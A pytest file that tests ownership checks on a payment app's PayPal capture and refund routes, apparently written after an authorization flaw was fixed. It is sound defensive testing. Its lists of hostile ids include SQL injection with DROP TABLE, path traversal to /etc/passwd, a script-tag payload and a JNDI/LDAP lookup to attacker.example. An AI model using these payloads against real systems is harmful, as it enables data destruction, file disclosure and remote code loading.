"""Capture/refund ownership gate tests (Phase 11F-B0).

THE VULNERABILITIES THESE TESTS CLOSE
    Before this phase, three routes took a PayPal identifier from the URL
    and handed it straight to PayPal under this installation's merchant
    credentials:

      POST /purchase/capture/{order_id}      captured without proving the
      POST /paypal/capture-order/{order_id}  order belonged to the local
                                             catalog transaction ledger
      POST /paypal/refund/{capture_id}       refunded without applying any
                                             of the deterministic refund
                                             eligibility rules

    So a client that supplied an order id this server never created — a
    Phase 11E EXTERNAL order, or any id at all — could make this server move
    money for it. And the catalog capture service logged-and-swallowed a
    missing ledger row AFTER PayPal had already captured, reporting a
    success with `transaction_id: null` as though nothing were wrong.

WHAT IS ASSERTED HERE
    1. Refusal is DETERMINISTIC and structured: a machine-readable `code`
       (EXTERNAL_ORDER_NOT_CAPTURABLE_HERE / UNKNOWN_ORDER /
       UNKNOWN_CAPTURE) at a fixed HTTP status, on both capture routes.
    2. PAYPAL IS NEVER CONTACTED on a refusal. Every negative test traps
       PayPal at TWO levels at once — the service-boundary function and
       httpx inside the paypal module — so a refusal that leaked through
       either one fails the test. No live PayPal call is made anywhere in
       this file.
    3. NO EXTERNAL ORDER EVER WRITES A CATALOG LEDGER ROW. The refused
       requests are followed by an assertion that the `transactions` table
       is still exactly as it was.
    4. The LEGITIMATE flows still work end to end: execute -> capture ->
       refund, on both the purchase-level and the PayPal-level routes.
    5. A CLIENT-SUPPLIED IDENTIFIER IS NOT AUTHORIZATION. Malicious ids
       (SQL injection, traversal, encoded separators, control characters,
       oversized input, unicode) and forged request bodies are refused, the
       ledger survives intact, and the value forwarded to PayPal is always
       the SERVER-STORED one.
    6. The swallowed-desync condition is now explicit and observable, and
       it does NOT claim the PayPal capture was rolled back.

The external rows are created through the production writers
(external_purchase_service._reserve/_settle), not hand-written SQL, so the
gate is matched against rows shaped exactly as Phase 11E stores them.
"""

from __future__ import annotations

import json
import sqlite3
from datetime import datetime, timezone
from types import SimpleNamespace
from urllib.parse import quote

import pytest
from starlette.testclient import TestClient

from app import paypal
from app.main import app
from app.schemas.external_purchase import ExternalOrderStatus
from app.schemas.transaction import TransactionStatus
from app.services import (
    external_purchase_service,
    order_ownership_service,
    purchase_execution_service,
    refund_service,
    transaction_service,
)

client = TestClient(app, raise_server_exceptions=False)

EXTERNAL_ORDER_ID = "EXTORDER123"
CATALOG_ORDER_ID = "CATORDER456"
STORED_CAPTURE_ID = "CAP-STORED-456"

CAPTURE_ROUTES = ("/purchase/capture", "/paypal/capture-order")


# ---------------------------------------------------------------------------
# Traps: nothing in this file may reach PayPal unless a test opts in.
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def paypal_trapped(monkeypatch):
    """Booby-trap PayPal at both levels for the whole module.

    Level 1 — the functions the services call (capture_order in the purchase
    service, refund_capture in the refund service). Level 2 — httpx inside
    the paypal module, so even a direct client call cannot escape.

    Returns a recorder; tests that NEED PayPal replace level 1 with a fake
    and assert on it. Tests that must not reach PayPal assert
    `trap.calls == []`, which is also enforced by the AssertionError these
    traps raise.
    """
    trap = SimpleNamespace(calls=[])

    def forbidden(name):
        def _raise(*args, **kwargs):
            trap.calls.append(name)
            raise AssertionError(
                f"PayPal must not be contacted ({name}) for a refused request"
            )

        return _raise

    monkeypatch.setattr(
        purchase_execution_service, "capture_order", forbidden("capture_order")
    )
    monkeypatch.setattr(refund_service, "refund_capture", forbidden("refund_capture"))
    monkeypatch.setattr(paypal.httpx, "post", forbidden("httpx.post"))
    monkeypatch.setattr(paypal.httpx, "get", forbidden("httpx.get"))
    return trap


@pytest.fixture
def capture_spy(monkeypatch):
    """Opt in to a mocked PayPal capture; records the id actually sent."""
    calls: list[str] = []

    def fake_capture(order_id):
        calls.append(order_id)
        return {
            "order_id": order_id,
            "status": "COMPLETED",
            "capture_id": STORED_CAPTURE_ID,
            "capture_status": "COMPLETED",
            "amount": "498.89",
            "currency": "USD",
        }

    monkeypatch.setattr(purchase_execution_service, "capture_order", fake_capture)
    return calls


@pytest.fixture
def refund_spy(monkeypatch):
    """Opt in to a mocked PayPal refund; records the id actually sent."""
    calls: list[str] = []

    def fake_refund(capture_id):
        calls.append(capture_id)
        return {
            "refund_id": "REF-789",
            "refund_status": "COMPLETED",
            "refunded_amount": "498.89",
            "currency": "USD",
        }

    monkeypatch.setattr(refund_service, "refund_capture", fake_refund)
    return calls


# ---------------------------------------------------------------------------
# Ledger builders
# ---------------------------------------------------------------------------


@pytest.fixture
def catalog_order():
    """A catalog `transactions` row at ORDER_CREATED, owning CATALOG_ORDER_ID."""
    return transaction_service.create_transaction(
        product_id="TAB003",
        product_name="Demo Tablet",
        catalog_price_inr=44900,
        paypal_amount="498.89",
        paypal_currency="USD",
        paypal_order_id=CATALOG_ORDER_ID,
    )


def make_captured(capture_id: str = STORED_CAPTURE_ID, order_id: str = "ORDER-CAP-1"):
    """A catalog transaction already CAPTURED with a stored capture id."""
    txn = transaction_service.create_transaction(
        product_id="TAB003",
        product_name="Demo Tablet",
        catalog_price_inr=44900,
        paypal_amount="498.89",
        paypal_currency="USD",
        paypal_order_id=order_id,
    )
    return transaction_service.update_status(
        txn.transaction_id, TransactionStatus.CAPTURED, capture_id=capture_id
    )


@pytest.fixture
def external_order():
    """An ORDER_CREATED row in external_purchase_orders, via 11E's writers.

    _reserve + _settle are the production code path (reservation committed
    first, then settled with PayPal's order id), so the row this gate is
    tested against is shaped exactly as Phase 11E stores it. No PayPal call
    is involved: both functions are pure storage.
    """
    now = datetime.now(timezone.utc).isoformat()
    approval = SimpleNamespace(
        approval_id="xapr_ownership_test",
        adopted_product_id="adopt_ownership_test",
        revalidation_id="reval_ownership_test",
    )
    reservation, existing = external_purchase_service._reserve(approval, now)
    assert reservation is not None and existing is None
    record = external_purchase_service._settle(
        reservation.execution_id,
        ExternalOrderStatus.ORDER_CREATED,
        now,
        paypal_order_id=EXTERNAL_ORDER_ID,
        paypal_amount="19.99",
        paypal_currency="USD",
    )
    assert record.status is ExternalOrderStatus.ORDER_CREATED
    return record


def catalog_ledger_rows() -> list:
    """Every row in the catalog ledger, for before/after comparison."""
    return [
        txn.model_dump()
        for txn in transaction_service.list_transactions(limit=100)
    ]


def detail_code(resp) -> str:
    """The structured refusal code, failing loudly on an unstructured body."""
    detail = resp.json()["detail"]
    assert isinstance(detail, dict), f"refusal must be structured, got {detail!r}"
    return detail["code"]


# ===========================================================================
# 1. A KNOWN EXTERNAL ORDER CANNOT BE CAPTURED — EITHER ENDPOINT
# ===========================================================================


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_external_order_cannot_be_captured(route, external_order, paypal_trapped):
    before = catalog_ledger_rows()

    resp = client.post(f"{route}/{EXTERNAL_ORDER_ID}")

    assert resp.status_code == 409
    assert detail_code(resp) == "EXTERNAL_ORDER_NOT_CAPTURABLE_HERE"
    assert resp.json()["detail"]["owner"] == "EXTERNAL"
    # No PayPal call, at either trapped level.
    assert paypal_trapped.calls == []
    # No catalog ledger row created or modified for the external order.
    assert catalog_ledger_rows() == before == []


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_refused_external_capture_never_reports_success(
    route, external_order, paypal_trapped
):
    body = client.post(f"{route}/{EXTERNAL_ORDER_ID}").json()
    text = json.dumps(body).lower()
    # No capture identifiers, no "captured" status, nothing fabricated.
    assert "capture_id" not in text
    assert "capture_status" not in text
    assert '"status": "captured"' not in text


def test_external_execution_record_is_untouched_by_a_refused_capture(
    external_order, paypal_trapped
):
    for route in CAPTURE_ROUTES:
        client.post(f"{route}/{EXTERNAL_ORDER_ID}")

    after = external_purchase_service.get(external_order.execution_id)
    assert after is not None
    assert after.model_dump() == external_order.model_dump()


def test_a_creating_external_reservation_has_no_order_id_to_capture(paypal_trapped):
    """A CREATING reservation's order id is NULL, so it cannot be matched.

    It therefore resolves to UNKNOWN_ORDER — still a refusal, and still
    without a PayPal call. Asserted so the NULL column can never be used to
    match an empty/blank order id against a reservation row.
    """
    now = datetime.now(timezone.utc).isoformat()
    reservation, _ = external_purchase_service._reserve(
        SimpleNamespace(
            approval_id="xapr_creating",
            adopted_product_id="adopt_creating",
            revalidation_id="reval_creating",
        ),
        now,
    )
    assert reservation.paypal_order_id is None

    # A blank id is rejected as malformed before any lookup...
    assert client.post("/purchase/capture/%20").status_code == 422
    # ...and the reservation itself is not capturable by any id.
    resp = client.post(f"/purchase/capture/{reservation.execution_id}")
    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_ORDER"
    assert paypal_trapped.calls == []


# ===========================================================================
# 2. AN UNKNOWN ORDER CANNOT BE CAPTURED — EITHER ENDPOINT
# ===========================================================================


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_unknown_order_cannot_be_captured(route, paypal_trapped):
    resp = client.post(f"{route}/TOTALLY-UNKNOWN-ORDER")

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_ORDER"
    assert resp.json()["detail"]["owner"] == "UNKNOWN"
    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == []


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_an_unknown_order_is_refused_even_with_a_real_order_elsewhere(
    route, catalog_order, external_order, paypal_trapped
):
    """Owning SOME order does not make a different id capturable."""
    before = catalog_ledger_rows()

    resp = client.post(f"{route}/SOME-OTHER-ORDER")

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_ORDER"
    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == before


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_blank_order_id_is_rejected_before_any_lookup(route, paypal_trapped):
    assert client.post(f"{route}/%20").status_code == 422
    assert paypal_trapped.calls == []


# ===========================================================================
# 3. THE DIRECT REFUND ROUTE ENFORCES ELIGIBILITY
# ===========================================================================


def test_unknown_capture_cannot_be_refunded(paypal_trapped):
    resp = client.post("/paypal/refund/CAP-NEVER-SEEN")

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_CAPTURE"
    assert paypal_trapped.calls == []


def test_a_client_supplied_capture_id_is_not_authorization(paypal_trapped):
    """A real CAPTURED transaction does not make ANOTHER capture refundable."""
    make_captured(capture_id="CAP-REAL-1")

    resp = client.post("/paypal/refund/CAP-ATTACKER-CHOSE-THIS")

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_CAPTURE"
    assert paypal_trapped.calls == []
    # The real transaction is untouched.
    assert (
        transaction_service.get_transaction_by_capture("CAP-REAL-1").status
        == TransactionStatus.CAPTURED
    )


def test_an_already_refunded_capture_is_refused_without_calling_paypal(
    paypal_trapped,
):
    txn = make_captured(capture_id="CAP-DONE")
    transaction_service.update_status(
        txn.transaction_id, TransactionStatus.REFUNDED, capture_id="CAP-DONE"
    )

    resp = client.post("/paypal/refund/CAP-DONE")

    assert resp.status_code == 409
    assert paypal_trapped.calls == []


def test_a_capture_on_a_non_captured_transaction_is_refused(paypal_trapped):
    """Deterministic eligibility: only CAPTURED is refundable.

    A FAILED transaction that still carries a capture id is exactly the case
    the old route ignored — it refunded whatever capture id it was handed.
    """
    txn = make_captured(capture_id="CAP-FAILED")
    transaction_service.update_status(
        txn.transaction_id, TransactionStatus.FAILED, capture_id="CAP-FAILED"
    )

    resp = client.post("/paypal/refund/CAP-FAILED")

    assert resp.status_code == 409
    assert paypal_trapped.calls == []


def test_an_unknown_external_identifier_cannot_be_refunded(
    external_order, paypal_trapped
):
    """An external ORDER id, and any id nothing holds, are UNKNOWN_CAPTURE.

    Phase 11F-D made external CAPTURE ids real, so the two cases are now
    distinct: an id no ledger stores is still UNKNOWN_CAPTURE, while a
    genuine external capture id gets its own explicit refusal (next test).
    """
    for identifier in (EXTERNAL_ORDER_ID, "EXTCAPTURE123"):
        resp = client.post(f"/paypal/refund/{identifier}")
        assert resp.status_code == 404
        assert detail_code(resp) == "UNKNOWN_CAPTURE"

    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == []


def test_a_real_external_capture_is_refused_explicitly(
    external_order, paypal_trapped
):
    """A capture id an external execution HOLDS is refused by name.

    This is the boundary Phase 11F-D had to preserve: external captures
    exist now, and the catalog refund path must still refuse them — the
    CAPTURED -> REFUNDED transition it performs is on a `transactions` row,
    which no external execution has, and external refunds do not exist.
    """
    with sqlite3.connect(external_purchase_service._db_path()) as conn:
        conn.execute(
            "UPDATE external_purchase_orders SET paypal_capture_id = ?, "
            "status = ? WHERE execution_id = ?",
            ("EXTCAP-REAL-1", "CAPTURED", external_order.execution_id),
        )
        conn.commit()

    resp = client.post("/paypal/refund/EXTCAP-REAL-1")

    assert resp.status_code == 409
    assert detail_code(resp) == "EXTERNAL_CAPTURE_NOT_REFUNDABLE_HERE"
    assert resp.json()["detail"]["owner"] == "EXTERNAL"
    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == []


def test_blank_capture_id_is_rejected_before_any_lookup(paypal_trapped):
    assert client.post("/paypal/refund/%20").status_code == 422
    assert paypal_trapped.calls == []


# ===========================================================================
# 4. THE LEGITIMATE FLOWS STILL WORK
# ===========================================================================


AUTONOMOUS_50K = {
    "purchase_requested": True,
    "autonomous_purchase_allowed": True,
    "auto_approve_below_inr": 50000,
}


@pytest.fixture
def create_order_spy(monkeypatch):
    def fake_create_order(amount, currency="USD", description=None, request_id=None):
        return {
            "order_id": CATALOG_ORDER_ID,
            "status": "CREATED",
            "approve_url": f"https://sandbox.paypal.com/checkoutnow?token={CATALOG_ORDER_ID}",
        }

    monkeypatch.setattr(purchase_execution_service, "create_order", fake_create_order)


def test_full_catalog_flow_execute_capture_refund(
    create_order_spy, capture_spy, refund_spy
):
    executed = client.post(
        "/purchase/execute",
        json={"product_id": "TAB003", "authorization": AUTONOMOUS_50K},
    )
    assert executed.status_code == 200
    txn_id = executed.json()["transaction_id"]

    captured = client.post(f"/purchase/capture/{CATALOG_ORDER_ID}")
    assert captured.status_code == 200
    assert captured.json()["transaction_id"] == txn_id
    assert captured.json()["transaction_status"] == "CAPTURED"
    assert capture_spy == [CATALOG_ORDER_ID]

    refunded = client.post(f"/transactions/{txn_id}/refund")
    assert refunded.status_code == 200
    assert refund_spy == [STORED_CAPTURE_ID]
    assert (
        transaction_service.get_transaction(txn_id).status
        == TransactionStatus.REFUNDED
    )


def test_catalog_order_captures_through_the_paypal_level_route_too(
    catalog_order, capture_spy
):
    resp = client.post(f"/paypal/capture-order/{CATALOG_ORDER_ID}")

    assert resp.status_code == 200
    body = resp.json()
    # Wire shape preserved: the ORDER status under "status", as before.
    assert body == {
        "order_id": CATALOG_ORDER_ID,
        "status": "COMPLETED",
        "capture_id": STORED_CAPTURE_ID,
        "capture_status": "COMPLETED",
        "amount": "498.89",
        "currency": "USD",
    }
    assert capture_spy == [CATALOG_ORDER_ID]
    # It is no longer an alternate route AROUND the ledger: it moved the row.
    assert (
        transaction_service.get_transaction(catalog_order.transaction_id).status
        == TransactionStatus.CAPTURED
    )


def test_direct_refund_route_refunds_an_eligible_catalog_capture(refund_spy):
    txn = make_captured(capture_id="CAP-ELIGIBLE")

    resp = client.post("/paypal/refund/CAP-ELIGIBLE")

    assert resp.status_code == 200
    assert resp.json()["refund_id"] == "REF-789"
    assert refund_spy == ["CAP-ELIGIBLE"]
    assert (
        transaction_service.get_transaction(txn.transaction_id).status
        == TransactionStatus.REFUNDED
    )


# ===========================================================================
# 5. NO EXTERNAL ORDER WRITES A CATALOG LEDGER ROW
# ===========================================================================


def test_no_catalog_row_is_written_by_any_external_capture_attempt(
    external_order, paypal_trapped
):
    assert catalog_ledger_rows() == []

    for route in CAPTURE_ROUTES:
        for attempt in (EXTERNAL_ORDER_ID, external_order.execution_id, "EXTCAP1"):
            client.post(f"{route}/{attempt}")
    client.post(f"/paypal/refund/{EXTERNAL_ORDER_ID}")

    assert catalog_ledger_rows() == []
    assert external_purchase_service.count() == 1


def test_the_catalog_ledger_is_untouched_when_both_ledgers_hold_rows(
    catalog_order, external_order, paypal_trapped
):
    before = catalog_ledger_rows()
    assert len(before) == 1

    for route in CAPTURE_ROUTES:
        assert client.post(f"{route}/{EXTERNAL_ORDER_ID}").status_code == 409

    assert catalog_ledger_rows() == before
    assert (
        transaction_service.get_transaction(catalog_order.transaction_id).status
        == TransactionStatus.ORDER_CREATED
    )


# ===========================================================================
# 6. MALICIOUS IDS AND REQUEST PAYLOADS CANNOT BYPASS THE GATE
# ===========================================================================


#: Each is sent as a single URL path segment, so it reaches the endpoint and
#: goes through the ownership check itself rather than being turned away by
#: the router. The tests below assert the STRUCTURED refusal code, so a
#: request that never reached the gate cannot pass them vacuously.
MALICIOUS_IDS = [
    "' OR '1'='1",
    "'; DROP TABLE transactions;--",
    "' UNION SELECT * FROM transactions--",
    '" OR 1=1 --',
    "%' --",
    f"{EXTERNAL_ORDER_ID}%00{CATALOG_ORDER_ID}",
    f"{EXTERNAL_ORDER_ID}%0d%0aX-Injected:+1",
    f"{CATALOG_ORDER_ID}%00",
    "{{7*7}}",
    "NULL",
    "null",
    "0",
    "-1",
    "*",
    "%25",
    "A" * 4096,
    "ＥＸＴＯＲＤＥＲ１２３",
    "EXTORDER‮123",
]

#: Traversal attempts whose encoded separators decode to "/" BEFORE routing,
#: so Starlette's router turns them away with a plain 404. Kept separate and
#: asserted separately: the guarantee is that traversal cannot address a
#: different route or reach PayPal, not that our gate saw the string.
ROUTER_REJECTED_IDS = [
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fORDER",
    f"..%2F..%2F{CATALOG_ORDER_ID}",
    # Encoded "/" from an embedded payload decodes the same way.
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "$%7Bjndi:ldap:%2F%2Fattacker.example%2Fx%7D",
]

#: Every code the gate may answer with, mapped to its status, so a test can
#: assert the refusal is one of OUR deterministic answers.
REFUSAL_STATUS = {
    "EXTERNAL_ORDER_NOT_CAPTURABLE_HERE": 409,
    "UNKNOWN_ORDER": 404,
    "UNKNOWN_CAPTURE": 404,
}


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
@pytest.mark.parametrize("bad_id", MALICIOUS_IDS)
def test_malicious_order_ids_cannot_capture_anything(
    route, bad_id, catalog_order, external_order, paypal_trapped
):
    before = catalog_ledger_rows()

    resp = client.post(f"{route}/{quote(bad_id, safe='%')}")

    # A deterministic refusal from OUR gate — never a capture, never a 5xx
    # from a crash in the lookup, never a plain router 404.
    code = detail_code(resp)
    assert code in REFUSAL_STATUS, code
    assert resp.status_code == REFUSAL_STATUS[code], resp.text
    assert paypal_trapped.calls == []
    # The ledger survived: no injected SQL executed, nothing was dropped.
    assert catalog_ledger_rows() == before
    assert (
        transaction_service.get_transaction_by_order(CATALOG_ORDER_ID).transaction_id
        == catalog_order.transaction_id
    )


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
@pytest.mark.parametrize("bad_id", ROUTER_REJECTED_IDS)
def test_traversal_ids_reach_no_endpoint_and_no_paypal(
    route, bad_id, catalog_order, external_order, paypal_trapped
):
    before = catalog_ledger_rows()

    resp = client.post(f"{route}/{bad_id}")

    assert resp.status_code == 404
    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == before


@pytest.mark.parametrize("bad_id", MALICIOUS_IDS)
def test_malicious_capture_ids_cannot_refund_anything(bad_id, paypal_trapped):
    txn = make_captured(capture_id="CAP-SAFE")

    resp = client.post(f"/paypal/refund/{quote(bad_id, safe='%')}")

    assert detail_code(resp) == "UNKNOWN_CAPTURE"
    assert resp.status_code == 404, resp.text
    assert paypal_trapped.calls == []
    assert (
        transaction_service.get_transaction(txn.transaction_id).status
        == TransactionStatus.CAPTURED
    )


#: Fields a client might hope the server reads instead of the URL, or that
#: might let it declare its own ownership verdict.
FORGED_BODY = {
    "order_id": CATALOG_ORDER_ID,
    "paypal_order_id": CATALOG_ORDER_ID,
    "capture_id": STORED_CAPTURE_ID,
    "paypal_capture_id": STORED_CAPTURE_ID,
    "transaction_id": "txn_forged",
    "owner": "CATALOG",
    "code": "OK",
    "product_id": "LAP001",
    "catalog_price_inr": 1,
    "amount": "0.01",
    "currency": "EUR",
    "status": "CAPTURED",
    "policy_decision": "ALLOW_AUTONOMOUS_PURCHASE",
    "external": False,
    "force": True,
}


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_a_forged_body_cannot_make_an_external_order_capturable(
    route, external_order, paypal_trapped
):
    resp = client.post(f"{route}/{EXTERNAL_ORDER_ID}", json=FORGED_BODY)

    assert resp.status_code == 409
    assert detail_code(resp) == "EXTERNAL_ORDER_NOT_CAPTURABLE_HERE"
    assert paypal_trapped.calls == []
    assert catalog_ledger_rows() == []


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_a_forged_body_cannot_make_an_unknown_order_capturable(
    route, paypal_trapped
):
    resp = client.post(f"{route}/UNKNOWN-TO-US", json=FORGED_BODY)

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_ORDER"
    assert paypal_trapped.calls == []


@pytest.mark.parametrize("field", sorted(FORGED_BODY))
def test_no_single_forged_field_can_authorize_a_refund(field, paypal_trapped):
    make_captured(capture_id="CAP-REAL-2")

    resp = client.post(
        "/paypal/refund/CAP-NOT-OURS", json={field: FORGED_BODY[field]}
    )

    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_CAPTURE"
    assert paypal_trapped.calls == []


@pytest.mark.parametrize(
    "body", [[], "a string", 42, None, {"nested": {"order_id": CATALOG_ORDER_ID}}]
)
def test_non_object_bodies_cannot_bypass_the_gate(body, paypal_trapped):
    resp = client.post("/purchase/capture/UNKNOWN-TO-US", json=body)
    assert resp.status_code == 404
    assert detail_code(resp) == "UNKNOWN_ORDER"
    assert paypal_trapped.calls == []


# --- The identifier forwarded upstream is always the STORED one ---------------


def test_a_padded_order_id_forwards_the_stored_value(catalog_order, capture_spy):
    """Whitespace normalization must not let a variant reach PayPal."""
    resp = client.post(f"/purchase/capture/%20{CATALOG_ORDER_ID}%20")

    assert resp.status_code == 200
    assert capture_spy == [CATALOG_ORDER_ID]  # stripped, stored form
    assert resp.json()["transaction_id"] == catalog_order.transaction_id


def test_a_paypal_response_echoing_another_order_id_cannot_redirect_the_write(
    catalog_order, monkeypatch
):
    """The ledger write is keyed on the STORED id, not PayPal's echo."""
    other = transaction_service.create_transaction(
        product_id="LAP001",
        product_name="Other Product",
        catalog_price_inr=10000,
        paypal_amount="111.11",
        paypal_currency="USD",
        paypal_order_id="OTHER-ORDER",
    )

    def lying_capture(order_id):
        return {
            "order_id": "OTHER-ORDER",  # not the order we asked to capture
            "status": "COMPLETED",
            "capture_id": "CAP-LIE",
            "capture_status": "COMPLETED",
            "amount": "0.01",
            "currency": "USD",
        }

    monkeypatch.setattr(purchase_execution_service, "capture_order", lying_capture)

    resp = client.post(f"/purchase/capture/{CATALOG_ORDER_ID}")

    assert resp.status_code == 200
    assert resp.json()["transaction_id"] == catalog_order.transaction_id
    assert (
        transaction_service.get_transaction(catalog_order.transaction_id).status
        == TransactionStatus.CAPTURED
    )
    # The unrelated transaction was NOT touched.
    assert (
        transaction_service.get_transaction(other.transaction_id).status
        == TransactionStatus.ORDER_CREATED
    )


# ===========================================================================
# 7. THE SWALLOWED DESYNC IS NOW EXPLICIT AND HONEST
# ===========================================================================


@pytest.mark.parametrize("route", CAPTURE_ROUTES)
def test_a_vanished_ledger_row_after_capture_is_reported_not_swallowed(
    route, catalog_order, monkeypatch
):
    """The row disappears between the ownership check and the ledger write.

    Formerly: logged, swallowed, and reported as a 200 success with
    transaction_id null. Now: a 500 that names the condition, states that
    PayPal DID capture, and states that nothing was rolled back.
    """

    def fake_capture(order_id):
        # Simulate the race: the owning row is gone by the time PayPal answers.
        with transaction_service._connect() as conn:
            conn.execute(
                "DELETE FROM transactions WHERE paypal_order_id = ?", (order_id,)
            )
        return {
            "order_id": order_id,
            "status": "COMPLETED",
            "capture_id": "CAP-RACE",
            "capture_status": "COMPLETED",
            "amount": "498.89",
            "currency": "USD",
        }

    monkeypatch.setattr(purchase_execution_service, "capture_order", fake_capture)

    resp = client.post(f"{route}/{CATALOG_ORDER_ID}")

    assert resp.status_code == 500
    detail = resp.json()["detail"]
    assert detail["code"] == "CAPTURE_LEDGER_DESYNC"
    # Honest about what happened: money moved, and nothing undid it.
    assert detail["paypal_captured"] is True
    assert detail["rolled_back"] is False
    assert detail["capture_id"] == "CAP-RACE"
    assert "not rolled back" in detail["message"].lower()
    # And it is NOT a success.
    assert resp.json().get("status") != "captured"


def test_the_desync_condition_is_a_real_exception_not_a_log_line():
    """A regression lock on the fix itself.

    The vulnerability was that TransactionNotFoundError was caught after a
    successful capture and turned into a warning. These assertions fail if
    that swallow is ever reintroduced.
    """
    assert hasattr(purchase_execution_service, "CaptureLedgerDesyncError")
    error = purchase_execution_service.CaptureLedgerDesyncError(
        {"order_id": "O1", "capture_id": "C1", "capture_status": "COMPLETED"}
    )
    detail = error.as_detail()
    assert detail["code"] == "CAPTURE_LEDGER_DESYNC"
    assert detail["paypal_captured"] is True
    assert detail["rolled_back"] is False


# ===========================================================================
# 8. THE RESOLVER ITSELF
# ===========================================================================


def test_resolver_classifies_each_ledger(catalog_order, external_order):
    owner, record = order_ownership_service.resolve_order_owner(CATALOG_ORDER_ID)
    assert owner is order_ownership_service.OrderOwner.CATALOG
    assert record.transaction_id == catalog_order.transaction_id

    owner, record = order_ownership_service.resolve_order_owner(EXTERNAL_ORDER_ID)
    assert owner is order_ownership_service.OrderOwner.EXTERNAL
    assert record.execution_id == external_order.execution_id

    owner, record = order_ownership_service.resolve_order_owner("NOBODY-OWNS-THIS")
    assert owner is order_ownership_service.OrderOwner.UNKNOWN
    assert record is None


@pytest.mark.parametrize("bad", ["", "   ", None, 123, [], {}])
def test_resolver_rejects_non_identifiers(bad):
    with pytest.raises(ValueError):
        order_ownership_service.resolve_order_owner(bad)
    with pytest.raises(ValueError):
        order_ownership_service.require_catalog_capture(bad)


def test_the_resolver_imports_no_paypal_client():
    """Structural: a refusal cannot reach PayPal because PayPal is not here.

    Checked on the module's own namespace rather than its text, so a comment
    mentioning PayPal cannot fail it and a real import cannot hide from it.
    """
    for name in ("httpx", "capture_order", "refund_capture", "create_order", "paypal"):
        assert not hasattr(order_ownership_service, name), name

    imported = {
        getattr(value, "__module__", None)
        for value in vars(order_ownership_service).values()
        if callable(value)
    }
    assert not any(
        module and module.endswith("paypal") for module in imported
    ), imported


def test_no_credentials_in_any_refusal_body(external_order, paypal_trapped):
    bodies = [
        client.post(f"/purchase/capture/{EXTERNAL_ORDER_ID}").text,
        client.post(f"/paypal/capture-order/{EXTERNAL_ORDER_ID}").text,
        client.post("/purchase/capture/UNKNOWN").text,
        client.post("/paypal/capture-order/UNKNOWN").text,
        client.post("/paypal/refund/UNKNOWN").text,
    ]
    for text in bodies:
        lowered = text.lower()
        for secret in ("client_secret", "access_token", "bearer", "client_id"):
            assert secret not in lowered
